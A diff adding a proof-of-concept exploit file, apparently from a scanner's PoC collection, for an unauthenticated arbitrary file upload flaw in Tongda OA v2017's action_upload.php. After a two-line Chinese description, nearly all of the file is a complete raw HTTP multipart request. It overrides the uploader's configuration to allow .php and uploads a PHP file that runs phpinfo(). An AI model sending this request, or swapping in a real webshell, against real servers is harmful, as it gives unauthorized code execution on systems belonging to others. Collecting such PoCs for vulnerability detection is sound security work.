@@ -1,0 +1,36 @@
+# 通达OA v2017 action_upload.php 任意文件上传漏洞
+# 通达OA v2017中的action_upload.php文件存在文件过滤不足的漏洞，攻击者无需后台权限即可利用此漏洞进行任意文件上传，从而可能导致系统执行恶意代码。
+POST /module/ueditor/php/action_upload.php?action=uploadfile&acid=80025411&bid=hd_tag_m8mv26bc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26bc
+RM-PRO-Token: 2a5a4def4bcb8cc036699030a521aded
+RM-PRO-Time: 1742808572685
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+ffff
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+1000000000
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+tcmd
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+.php
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="ffff"; filename="test.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();echo("test123");?>
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="mufile"
+
+submit
+-----------------------------55719851240137822763221368724--
